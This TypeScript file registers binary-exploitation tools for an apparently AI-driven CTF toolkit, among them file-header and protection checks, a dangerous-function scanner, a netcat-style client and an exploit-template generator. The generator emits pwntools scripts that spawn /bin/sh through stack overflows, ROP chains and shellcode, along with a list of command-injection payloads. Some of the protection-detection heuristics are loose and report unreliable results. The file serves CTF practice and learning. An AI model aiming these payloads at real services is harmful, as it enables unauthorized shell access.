import { z } from "zod";
import * as fs from "fs";
import { ToolRegistry } from "./registry";

export function createPwnTools(): ToolRegistry {
  const registry = new ToolRegistry();

  registry.register({
    name: "binary_analysis",
    description: "二进制文件基础分析：检测文件类型(ELF/PE/Mach-O)、架构、32/64位、保护机制",
    parameters: z.object({
      path: z.string().describe("二进制文件路径"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path } = args;
      try {
        const buf = fs.readFileSync(path);
        const header = buf.slice(0, 32);
        const magic = header.toString("hex").toUpperCase();

        let fileType = "未知";
        let arch = "未知";
        let bits = "未知";
        let endianness = "未知";
        let protections: string[] = [];

        if (buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46) {
          fileType = "ELF";
          const ei_class = buf[4];
          bits = ei_class === 1 ? "32-bit" : ei_class === 2 ? "64-bit" : "未知";
          endianness = buf[5] === 1 ? "Little Endian" : "Big Endian";
          const e_type = buf[16];
          const typeNames: Record<number, string> = { 1: "REL(可重定位)", 2: "EXEC(可执行)", 3: "DYN(共享库/PIC)", 4: "CORE(Core文件)" };
          const type = typeNames[e_type] || `Unknown(${e_type})`;

          if (buf[4] === 2) {
            const e_entry = buf.readBigUInt64LE(24);
            protections.push(`入口点: 0x${e_entry.toString(16)}`);
          }
          protections.push(`类型: ${type}`);

          if (buf.includes(Buffer.from("GNU_STACK")) || buf.includes(Buffer.from("GNU_RELRO"))) {
            protections.push("RELRO: 部分/完整");
          }
          if (buf.includes(Buffer.from(".note.ABI-tag"))) protections.push("栈保护: 可能开启");
          if (type === "DYN" || type === "EXEC") protections.push("PIE: 可能开启(DYN类型)");
          if (buf.includes(Buffer.from("__stack_chk_fail"))) protections.push("Stack Canary: 检测到");

        } else if (buf[0] === 0x4d && buf[1] === 0x5a) {
          fileType = "PE (Windows)";
          const peOffset = buf.readUInt32LE(0x3c);
          if (buf[peOffset] === 0x50 && buf[peOffset + 1] === 0x45) {
            const machine = buf.readUInt16LE(peOffset + 4);
            arch = machine === 0x14c ? "x86" : machine === 0x8664 ? "x64" : `Unknown(0x${machine.toString(16)})`;
            const optionalHeaderSize = buf.readUInt16LE(peOffset + 20);
            const magic = buf.readUInt16LE(peOffset + 24);
            bits = magic === 0x10b ? "32-bit" : magic === 0x20b ? "64-bit" : "未知";

            const dllChars = buf.readUInt16LE(peOffset + 24 + 70);
            if (dllChars & 0x40) protections.push("ASLR/PIE: 已启用(DYNAMIC_BASE)");
            if (dllChars & 0x100) protections.push("NX DEP: 已启用(HIGH_ENTROPY_VA)");
            if (dllChars & 0x2000) protections.push("CFG: Control Flow Guard");
          }

        } else if (buf[0] === 0xcf && buf[1] === 0xfa) {
          fileType = "Mach-O (macOS/iOS 64-bit)";
          bits = "64-bit";
          const cputype = buf.readUInt32LE(4);
          arch = cputype === 0x1000007 ? "x86_64" : cputype === 0x100000c ? "ARM64" : "未知";

        } else if (buf[0] === 0xca && buf[1] === 0xfe) {
          fileType = "Mach-O (32-bit)";
          bits = "32-bit";

        } else if (buf[0] === 0x50 && buf[1] === 0x4b) {
          fileType = "ZIP/PK (可能是JAR/APK/Office文档)";
        } else if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47) {
          fileType = "PNG 图片";
        } else if (buf[0] === 0xff && buf[1] === 0xd8) {
          fileType = "JPEG 图片";
        } else {
          fileType = `未知 (magic: ${magic.slice(0, 16)})`;
        }

        return `[二进制分析] ${path}\n大小: ${buf.length} 字节\n\n文件类型: ${fileType}\n架构: ${arch}\n位数: ${bits}\n字节序: ${endianness}\n\n保护机制:\n${protections.length ? protections.map((p) => `  ${p}`).join("\n") : "  (未检测到或不适用)"}`;
      } catch (err: any) {
        return `[分析失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "extract_strings",
    description: "从二进制文件中提取可打印字符串（类似 strings 命令）",
    parameters: z.object({
      path: z.string().describe("二进制文件路径"),
      minLength: z.number().optional().describe("最小字符串长度，默认 4"),
      encoding: z.enum(["ascii", "utf16"]).optional().describe("编码类型，默认 ascii"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path, minLength = 4, encoding = "ascii" } = args;
      try {
        const buf = fs.readFileSync(path);
        const strings: string[] = [];

        if (encoding === "ascii") {
          let current = "";
          for (const byte of buf) {
            if (byte >= 0x20 && byte <= 0x7e) {
              current += String.fromCharCode(byte);
            } else {
              if (current.length >= minLength) strings.push(current);
              current = "";
            }
          }
          if (current.length >= minLength) strings.push(current);
        } else {
          const utf16Buf = buf.toString("utf16le");
          let current = "";
          for (const ch of utf16Buf) {
            const code = ch.charCodeAt(0);
            if (code >= 0x20 && code <= 0x7e) {
              current += ch;
            } else {
              if (current.length >= minLength) strings.push(current);
              current = "";
            }
          }
          if (current.length >= minLength) strings.push(current);
        }

        const interesting = strings.filter((s) =>
          /flag|ctf|password|secret|key|http|\/bin\/|\/etc\/|\\\\x[0-9a-f]/i.test(s) ||
          /addr|printf|scanf|system|exec|fork|malloc|free/i.test(s)
        );

        return `[字符串提取] ${path}\n总字符串数: ${strings.length}\n\n感兴趣的字符串 (${interesting.length}):\n${interesting.slice(0, 100).map((s) => `  "${s}"`).join("\n")}${interesting.length > 100 ? `\n... 还有 ${interesting.length - 100} 条` : ""}`;
      } catch (err: any) {
        return `[提取失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "vulnerability_scan",
    description: "检测二进制中的常见漏洞模式（危险函数、格式化字符串、整数溢出等）",
    parameters: z.object({ path: z.string().describe("二进制文件路径") }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path } = args;
      try {
        const buf = fs.readFileSync(path);
        const data = buf.toString("binary");

        const dangerousFunctions = [
          { name: "strcpy", desc: "缓冲区溢出：无长度检查" },
          { name: "strcat", desc: "缓冲区溢出：无长度检查" },
          { name: "gets", desc: "缓冲区溢出：无长度检查（极危险）" },
          { name: "sprintf", desc: "缓冲区溢出：无长度检查" },
          { name: "scanf", desc: "缓冲区溢出：可能溢出" },
          { name: "system", desc: "命令执行：可能存在命令注入" },
          { name: "execve", desc: "命令执行：可能执行任意命令" },
          { name: "popen", desc: "命令执行：可能执行任意命令" },
          { name: "atoi", desc: "整数溢出：可能导致整数绕过" },
          { name: "atol", desc: "整数溢出：可能导致整数绕过" },
          { name: "strtol", desc: "整数溢出：检查错误处理" },
          { name: "memcpy", desc: "缓冲区溢出：检查长度参数" },
          { name: "alloca", desc: "栈溢出：在栈上分配可变大小" },
          { name: "vsprintf", desc: "格式化字符串漏洞" },
          { name: "vprintf", desc: "格式化字符串漏洞" },
          { name: "vsnprintf", desc: "格式化字符串漏洞" },
          { name: "read", desc: "缓冲区溢出：检查长度和返回值" },
          { name: "recv", desc: "缓冲区溢出：检查长度参数" },
          { name: "recvfrom", desc: "缓冲区溢出：检查长度参数" },
          { name: "memmove", desc: "缓冲区溢出：检查长度" },
          { name: "realloc", desc: "堆漏洞：UAF/Double Free 可能" },
          { name: "free", desc: "堆漏洞：检查是否 double free" },
        ];

        const findings: string[] = [];
        for (const fn of dangerousFunctions) {
          const pattern = new RegExp(fn.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g");
          let match;
          while ((match = pattern.exec(data)) !== null) {
            findings.push(`  ⚠️ ${fn.name}: ${fn.desc}`);
            break;
          }
        }

        const formatStrVuln = /"%[^%]*%[sd]"/.test(data);
        if (formatStrVuln) findings.push("  ⚠️ 格式化字符串漏洞：检测到潜在的格式化字符串模式");

        return `[漏洞模式扫描] ${path}\n\n危险函数调用:\n${findings.length ? findings.join("\n") : "  ✓ 未检测到危险函数"}\n\n建议:\n- strcpy/gets/sprintf 等无边界检查函数是栈溢出的主要来源\n- system/execve 等函数结合用户输入可能导致命令执行\n- 检查是否存在格式化字符串漏洞（printf(user_input)）\n- 检查整数溢出是否可导致缓冲区绕过`;
      } catch (err: any) {
        return `[扫描失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "exploit_template",
    description: "生成 Pwn Exploit 模板（Python pwntools 脚本）",
    parameters: z.object({
      binaryType: z.enum(["elf_32", "elf_64", "pe", "通用"]).describe("二进制类型"),
      hasCanary: z.boolean().optional().describe("是否有 Stack Canary"),
      hasNx: z.boolean().optional().describe("是否有 NX (DEP)"),
      hasPie: z.boolean().optional().describe("是否有 PIE/ASLR"),
      vulnType: z.enum(["stack_bof", "format_string", "heap_uaf", "heap_double_free", "integer_overflow", "command_injection", "ret2libc", "ret2shellcode", "rop_chain", "unknown"]).describe("漏洞类型"),
      binaryPath: z.string().optional().describe("二进制文件路径"),
      remoteAddr: z.string().optional().describe("远程地址，如 1.2.3.4:4567"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { binaryType, hasCanary = false, hasNx = true, hasPie = true, vulnType, binaryPath = "./vuln", remoteAddr } = args;

      const arch = binaryType.includes("32") ? "i386" : "amd64";
      const bufSize = binaryType.includes("32") ? "32" : "64";

      const remoteLines = remoteAddr
        ? `host = '${remoteAddr.split(":")[0]}'\nport = ${remoteAddr.split(":")[1] || "0"}\n# p = remote(host, port)`
        : `# p = remote('target.com', 4444)`;

      const canaryLine = hasCanary
        ? "canary_leak = ...  # 泄露 canary 值"
        : "# 无 canary";

      const canaryPayload = hasCanary
        ? "    canary_leak,  # 泄露的 canary 值"
        : "";

      const nxComment = hasNx
        ? "# NX 开启，需要 ret2libc 或 ROP"
        : "# NX 关闭，可直接 shellcode";

      const pieComment = hasPie
        ? "# PIE 开启，需要泄露基地址"
        : "# PIE 关闭，地址固定";

      const backtick = String.fromCharCode(96);

      const stackBof = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        `context.arch = '${arch}'`,
        `context.log_level = 'info'`,
        "",
        `binary = ELF('${binaryPath}')`,
        "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 调整路径",
        "",
        "# p = process(binary.path)",
        remoteLines,
        "",
        "# 缓冲区大小 (需通过逆向确认)",
        `buffer_size = ${bufSize}`,
        "",
        "# Canary 泄露 (如果有)",
        canaryLine,
        "",
        "# Ret2libc 地址",
        nxComment,
        pieComment,
        "",
        "payload = flat([",
        "    b'A' * buffer_size,",
        canaryPayload,
        "    b'B' * 8,  # 保存的 RBP",
        "    binary.symbols['system'],  # 或 ROP 链",
        "    b'\\x00' * 8,",
        "    next(libc.search(b'/bin/sh')),",
        "])",
        "",
        "p.sendline(payload)",
        "p.interactive()",
      ].join("\n");

      const formatString = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# 格式化字符串漏洞利用",
        "# 1. 泄露栈上的值",
        "# 2. 控制返回地址",
        "",
        "# 阶段1: 确认漏洞",
        "payload = b'%p.' * 30",
        "# p.sendline(payload)",
        "",
        "# 阶段2: 计算偏移",
        "# 发现偏移后：%N$p 可以直接获取第N个参数",
        "# %N$n 可以向第N个参数指向的地址写入值",
        "",
        "# 控制 GOT 表中的某个函数（如 printf）为 system",
        "# 然后触发该函数，参数为 '/bin/sh'",
      ].join("\n");

      const heapUaf = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# Use-After-Free 利用模板",
        "# 核心：分配 A -> 释放 A -> 分配 B (可改写 A 的元数据)",
        "",
        "# tcache poisoning (glibc 2.27+)",
        "# 1. 分配一个 chunk",
        "# 2. 释放它 (进入 tcache)",
        "# 3. 分配相同大小的 chunk (从 tcache 获取，可控 fd/bk)",
        "# 4. 写入目标地址到 fd",
        "# 5. 再次分配，chunk 会被放到目标地址",
        "",
        "# fastbin dup (glibc < 2.27)",
        "# 1. 释放一个 chunk",
        "# 2. 再分配一个相同大小的 chunk (从 fastbin 获取)",
        "# 3. 释放它 (fastbin 中现在有两个相同的 chunk)",
        "# 4. 分配两次 (获得两个指向同一内存的指针)",
      ].join("\n");

      const commandInjection = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# 命令注入利用",
        "# 如果程序将用户输入直接拼接到 system()/execve()",
        "",
        "# 分号分隔",
        "payload = b'; /bin/sh'",
        "# 管道符",
        "payload = b'| /bin/sh'",
        "# AND 连接",
        "payload = b' && /bin/sh'",
        "# 反引号",
        `payload = b'${backtick}/bin/sh${backtick}'`,
        "# $()",
        "payload = b'$(/bin/sh)'",
        "# 换行符",
        "payload = b'\\n/bin/sh'",
      ].join("\n");

      const ret2libcTpl = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# Ret2libc: 利用已经加载的 libc 中的 system()",
        "# 不需要知道 system() 的精确地址",
        "",
        "# 1. 泄露 libc 基地址 (通过 puts/printf 输出某个 GOT 表项)",
        "# 2. 计算 system() 和 '/bin/sh' 地址",
        "# 3. 构造 ROP 链调用 system('/bin/sh')",
        "",
        "puts_addr = leaked_puts - libc.symbols['puts']",
        "libc_base = puts_addr - libc.symbols['puts']",
        "system_addr = libc_base + libc.symbols['system']",
        "binsh_addr = libc_base + next(libc.search(b'/bin/sh'))",
      ].join("\n");

      const ret2Shellcode = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        `context.arch = '${arch}'`,
        "",
        "# NX 关闭，可以执行栈上的 shellcode",
        `shellcode = shellcraft.${arch}.sh()`,
        "shellcode_bytes = asm(shellcode)",
        "",
        "# 找一个指向栈缓冲区的地址",
        "# 通过信息泄露或猜测",
        "buffer_addr = 0x7fffffffe000  # 示例地址",
        "",
        "payload = shellcode_bytes.ljust(buffer_size, b'A') + p64(buffer_addr)",
      ].join("\n");

      const integerOverflow = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# 整数溢出利用",
        "# 如果程序使用有符号整数处理缓冲区大小",
        "# 负数会绕过 size 检查，但在 memcpy 时变为大正数",
        "",
        "# 1. 找到整数检查的位置",
        "# 2. 传入 -1 (0xFFFFFFFF) 作为 size",
        "# 3. 绕过检查后触发大拷贝",
      ].join("\n");

      const ropChain = [
        "#!/usr/bin/env python3",
        "from pwn import *",
        "",
        "# ROP Chain: 利用 gadget 构造任意调用",
        "# 1. 寻找 pop rdi; ret gadget",
        "# 2. 寻找 system() 地址",
        "# 3. 寻找 '/bin/sh' 字符串",
        "",
        "pop_rdi_ret = 0x400683  # 示例，需通过 ROPgadget 获取",
        "pop_rsi_ret = 0x400681",
        "system_addr = binary.symbols['system']",
        "binsh_addr = next(binary.search(b'/bin/sh'))",
        "",
        "payload = b'A' * 72  # offset",
        "payload += p64(pop_rdi_ret)",
        "payload += p64(binsh_addr)",
        "payload += p64(system_addr)",
      ].join("\n");

      const templateMap: Record<string, string> = {
        stack_bof: stackBof,
        format_string: formatString,
        heap_uaf: heapUaf,
        command_injection: commandInjection,
        ret2libc: ret2libcTpl,
        ret2shellcode: ret2Shellcode,
        integer_overflow: integerOverflow,
        rop_chain: ropChain,
        heap_double_free: heapUaf,
        unknown: stackBof,
      };

      const template = templateMap[vulnType] || templateMap.stack_bof;
      return `[Exploit模板] ${vulnType} - ${binaryType}\n\n已生成 pwntools 模板：\n\n${template}\n\n提示:\n- 使用 ROPgadget 查找 gadget: ROPgadget --binary ${binaryPath}\n- 使用 checksec 检查保护: checksec ${binaryPath}\n- 使用 pwn init 创建项目: pwn init ${binaryPath}`;
    },
  });

  registry.register({
    name: "elf_got_plt_analysis",
    description: "ELF GOT/PLT 分析：解析动态链接表，提取导入函数地址",
    parameters: z.object({
      path: z.string().describe("ELF 二进制文件路径"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { path } = args;
      try {
        const buf = fs.readFileSync(path);
        if (buf[0] !== 0x7f || buf[1] !== 0x45 || buf[2] !== 0x4c || buf[3] !== 0x46) {
          return "[ELF GOT/PLT分析] 不是有效的 ELF 文件";
        }

        const is64 = buf[4] === 2;
        const isLE = buf[5] === 1;
        const ei_class = buf[4];

        const results: string[] = [];

        if (ei_class === 2) {
          const dynSectionOffset = isLE ? buf.readBigUInt64LE(24) : buf.readBigUInt64BE(24);
          results.push(`入口点: 0x${dynSectionOffset.toString(16)}`);

          let offset = 0;
          while (offset < buf.length - 68) {
            const p_type = buf.readUInt32LE(offset + 4);
            if (p_type === 1) {
              const p_offset = Number(buf.readBigUInt64LE(offset + 8));
              const p_filesz = Number(buf.readBigUInt64LE(offset + 32));
              if (p_offset && p_filesz) {
                results.push(`LOAD段 @0x${p_offset.toString(16)}, 大小 0x${p_filesz.toString(16)}`);
              }
            }
            if (p_type === 2) {
              const p_offset = Number(buf.readBigUInt64LE(offset + 8));
              const p_filesz = Number(buf.readBigUInt64LE(offset + 32));
              results.push(`DYNAMIC段 @0x${p_offset.toString(16)}, 大小 0x${p_filesz.toString(16)}`);

              if (p_offset && p_filesz) {
                let dynamicOffset = p_offset;
                const tags: string[] = [];
                while (dynamicOffset < p_offset + p_filesz) {
                  const d_tag = Number(buf.readBigUInt64LE(dynamicOffset));
                  if (d_tag === 0) break;
                  const d_val = Number(buf.readBigUInt64LE(dynamicOffset + 8));
                  const tagNames: Record<number, string> = {
                    1: "NEEDED", 2: "PLTRELSZ", 3: "PLTGOT", 4: "HASH",
                    5: "STRTAB", 6: "SYMTAB", 10: "STRSZ", 11: "SYMENT",
                    23: "JMPREL", 25: "PLTREL",
                  };
                  tags.push(`  ${tagNames[d_tag] || `TAG_${d_tag}`} = 0x${d_val.toString(16)}`);
                  dynamicOffset += 16;
                }
                results.push("动态链接标签:\n" + tags.join("\n"));
              }
            }
            offset += 56;
          }
        }

        if (ei_class === 1) {
          results.push("32位 ELF - GOT/PLT 简化分析");
          const e_entry = buf.readUInt32LE(24);
          results.push(`入口点: 0x${e_entry.toString(16)}`);
        }

        const hasStackCanary = buf.includes(Buffer.from("__stack_chk_fail"));
        const hasFORTIFY = buf.includes(Buffer.from("__stack_chk_guard"));
        const hasPIE = buf.includes(Buffer.from("Position Independent Executable")) ||
          buf.includes(Buffer.from("Shared object file"));

        results.push(`\n安全检查:\n  Stack Canary: ${hasStackCanary ? "✅ 已启用" : "❌ 未启用"}`);
        results.push(`  FORTIFY: ${hasFORTIFY ? "✅ 已启用" : "❌ 未启用"}`);
        results.push(`  PIE: ${hasPIE ? "✅ 可能启用 (DYN类型)" : "❌ 未启用"}`);

        return `[ELF GOT/PLT分析] ${path}\n架构: ${is64 ? "x86_64" : "i386"} (${isLE ? "小端" : "大端"})\n\n${results.join("\n")}\n\n提示: 使用 readelf -d 查看动态段, objdump -d -j .plt 查看PLT`;
      } catch (err: any) {
        return `[ELF分析失败] ${err.message}`;
      }
    },
  });

  registry.register({
    name: "nc_remote_client",
    description: "远程TCP连接测试（类似 nc），用于与 Pwn 题目远程服务交互",
    parameters: z.object({
      host: z.string().describe("目标主机 IP"),
      port: z.number().describe("目标端口"),
      sendData: z.string().optional().describe("要发送的数据"),
      timeout: z.number().optional().describe("超时毫秒, 默认 5000"),
    }),
    category: "pwn",
    requirePermission: true,
    execute: async (args: any) => {
      const net = require("net");
      const { host, port, sendData, timeout = 5000 } = args;

      return new Promise((resolve) => {
        const client = net.createConnection({ host, port }, () => {
          let result = `[NC连接] ${host}:${port} 已连接\n`;

          if (sendData) {
            client.write(sendData + "\n");
            result += `发送: ${sendData}\n`;
          } else {
            result += "连接已建立 (未发送数据)\n";
          }

          setTimeout(() => {
            client.end();
            resolve(result + "(超时，连接已关闭)");
          }, timeout);
        });

        let received = "";
        client.on("data", (data: Buffer) => {
          received += data.toString("utf-8");
        });

        client.on("error", (err: Error) => {
          resolve(`[NC错误] ${err.message}`);
        });

        client.on("close", () => {
          let result = `[NC连接] ${host}:${port} 已关闭\n`;
          if (received) result += `接收数据:\n${received}\n`;
          resolve(result);
        });

        client.on("timeout", () => {
          client.destroy();
          resolve(`[NC超时] ${host}:${port} 连接超时`);
        });

        setTimeout(() => {
          client.destroy();
          resolve(`[NC超时] ${host}:${port} 连接超时`);
        }, timeout + 2000);
      });
    },
  });

  registry.register({
    name: "memory_layout",
    description: "内存布局分析：基于二进制类型和保护机制推断栈/堆布局",
    parameters: z.object({
      binaryType: z.enum(["elf_32", "elf_64", "pe", "macho", "通用"]).describe("二进制类型"),
      protections: z.array(z.string()).optional().describe("已检测的保护机制"),
    }),
    category: "pwn",
    concurrent: true,
    execute: async (args: any) => {
      const { binaryType, protections = [] } = args;

      const arch = binaryType.includes("32") || binaryType === "pe" ? "i386" : "amd64";
      const ptrSize = arch === "i386" ? 4 : 8;
      const hasCanary = protections.includes("canary") || protections.includes("Stack Canary");
      const hasNX = protections.includes("NX") || protections.includes("DEP");
      const hasPIE = protections.includes("PIE");

      const stackLayout = [
        "高地址",
        "┌─────────────────────┐",
        "│   环境变量/参数     │",
        "├─────────────────────┤",
        "│   栈帧 (Stack Frame) │",
        "│   - local vars      │",
        hasCanary ? "│   - ⚠️ Canary值      │" : "│   - 无Canary         │",
        "│   - Saved RBP       │",
        "│   - Return Address  │",
        "├─────────────────────┤",
        "│   堆 (Heap)         │",
        "├─────────────────────┤",
        "│   BSS/Data段        │",
        "├─────────────────────┤",
        "│   .text (代码段)    │",
        "低地址",
      ];

      const exploitationPath: string[] = [];
      if (!hasNX) {
        exploitationPath.push("1. NX关闭 → 可直接在栈/堆执行 Shellcode (ret2shellcode)");
      } else {
        exploitationPath.push("1. NX开启 → 需要 ret2libc 或 ROP 链");
      }
      if (hasCanary) {
        exploitationPath.push("2. 有Canary → 需要信息泄露(格式化字符串/未初始化变量)绕过");
      }
      if (hasPIE) {
        exploitationPath.push("3. PIE开启 → 需要泄露代码段基地址(通过GOT/PLT)");
      }
      exploitationPath.push(`4. 指针大小: ${ptrSize}字节 (${arch})`);

      const heapNotes = [
        "glibc < 2.27: fastbin attack",
        "glibc >= 2.27: tcache poisoning",
        "glibc >= 2.29: tcache double free key检查",
        "glibc >= 2.32: safe linking",
        "架构特定: 32位有mallopt, 64位更严格",
      ];

      return `[内存布局分析] ${binaryType}\n\n${stackLayout.join("\n")}\n\n利用路径:\n${exploitationPath.join("\n")}\n\n堆利用笔记:\n${heapNotes.map((n) => `  • ${n}`).join("\n")}\n\n建议:\n- 使用 checksec 确认保护\n- 使用 readelf -s 查看符号\n- 使用 objdump -d 查看汇编`;
    },
  });

  return registry;
}